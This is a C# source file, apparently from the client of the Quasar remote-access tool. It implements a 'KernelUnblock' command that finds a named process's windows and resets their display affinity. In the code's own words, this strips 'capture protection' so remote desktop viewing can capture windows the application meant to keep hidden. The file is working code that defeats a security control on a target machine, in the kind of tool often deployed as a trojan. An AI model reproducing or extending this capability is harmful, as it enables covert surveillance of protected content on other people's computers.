using Quasar.Client.Helper;
using Quasar.Client.Logging;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace Quasar.Client.RemoteDesktop
{
    /// <summary>
    /// Implements the user-mode logic for clearing window display affinity flags.
    /// </summary>
    internal sealed class KernelUnblockCommand
    {
        private readonly KernelDriverLogger _logger;

        public KernelUnblockCommand(KernelDriverLogger logger = null)
        {
            _logger = logger ?? new KernelDriverLogger();
        }

        public KernelUnblockResult Execute(DoKernelUnblock request, KernelDriverState driverState)
        {
            if (request == null)
                throw new ArgumentNullException(nameof(request));

            var normalizedName = NormalizeProcessName(request.ProcessName);
            if (string.IsNullOrEmpty(normalizedName))
            {
                _logger?.Warning("KernelUnblock invoked without a valid process name.");
                return new KernelUnblockResult
                {
                    Result = KernelUnblockResultCode.Failed,
                    Message = "Process name is required.",
                    DriverState = driverState
                };
            }

            Process[] targets;
            try
            {
                targets = Process.GetProcessesByName(normalizedName);
            }
            catch (Exception ex)
            {
                _logger?.Error($"KernelUnblock failed to enumerate processes: {ex.Message}");
                return new KernelUnblockResult
                {
                    Result = KernelUnblockResultCode.AccessDenied,
                    Message = $"Unable to enumerate processes: {ex.Message}",
                    DriverState = driverState
                };
            }

            if (targets.Length == 0)
            {
                _logger?.Info($"KernelUnblock found no processes matching \"{normalizedName}\".");
                return new KernelUnblockResult
                {
                    Result = KernelUnblockResultCode.NoMatchingProcess,
                    Message = $"No running process named \"{normalizedName}\".",
                    DriverState = driverState
                };
            }

            var stopwatch = Stopwatch.StartNew();
            var handles = new HashSet<IntPtr>();
            foreach (var process in targets)
            {
                try
                {
                    foreach (var handle in NativeMethodsHelper.EnumerateProcessWindows(process.Id, request.IncludeChildProcesses))
                        handles.Add(handle);
                }
                finally
                {
                    process.Dispose();
                }
            }

            var updated = 0;
            var attempted = 0;
            var failures = 0;
            var skipped = 0;
            var failureDetails = new List<string>();

            foreach (var handle in handles)
            {
                if (handle == IntPtr.Zero)
                    continue;

                attempted++;
                var resetResult = NativeMethodsHelper.ResetWindowDisplayAffinity(handle, skipIfAlreadyReset: !request.ForceResetAffinity, out var win32);
                switch (resetResult)
                {
                    case NativeMethodsHelper.WindowAffinityResetResult.ResetPerformed:
                        updated++;
                        break;
                    case NativeMethodsHelper.WindowAffinityResetResult.Skipped:
                        skipped++;
                        break;
                    default:
                        failures++;
                        if (win32 != 0)
                        {
                            var detail = $"Handle 0x{handle.ToInt64():X} failed with 0x{win32:X}.";
                            failureDetails.Add(detail);
                            _logger?.Warning($"KernelUnblock {detail}");
                        }
                        break;
                }
            }

            stopwatch.Stop();

            var result = new KernelUnblockResult
            {
                Result = DetermineResult(updated, attempted, failures),
                DriverState = driverState,
                ProcessName = normalizedName,
                ProcessesInspected = targets.Length,
                WindowsUpdated = updated,
                Message = BuildMessage(updated, attempted, failures, skipped, failureDetails),
                ElapsedMilliseconds = stopwatch.ElapsedMilliseconds
            };

            _logger?.Info($"KernelUnblock \"{normalizedName}\" completed: {result.Result}, windows={result.WindowsUpdated}, attempts={attempted}, failures={failures}, skipped={skipped}.");
            return result;
        }

        private static string NormalizeProcessName(string input)
        {
            if (string.IsNullOrWhiteSpace(input))
                return string.Empty;

            var trimmed = input.Trim();
            var name = Path.GetFileNameWithoutExtension(trimmed);
            return name ?? string.Empty;
        }

        private static KernelUnblockResultCode DetermineResult(int updated, int attempted, int failures)
        {
            if (updated > 0)
                return KernelUnblockResultCode.Success;

            if (attempted == 0)
                return KernelUnblockResultCode.Failed;

            return failures > 0 ? KernelUnblockResultCode.Failed : KernelUnblockResultCode.Success;
        }

        private static string BuildMessage(int updated, int attempted, int failures, int skipped, IReadOnlyList<string> failureDetails)
        {
            if (attempted == 0)
                return "No eligible windows were found for the target process.";

            if (failures == 0)
            {
                if (skipped > 0 && updated == 0)
                    return "Target windows were already captureable.";

                return skipped > 0
                    ? $"Reset capture protection on {updated} window(s); {skipped} already captureable."
                    : $"Reset capture protection on {updated} window(s).";
            }

            var detail = failureDetails != null && failureDetails.Count > 0
                ? $" Example: {failureDetails[0]}"
                : string.Empty;

            return $"Reset {updated} window(s); {failures} failed.{detail}";
        }
    }
}
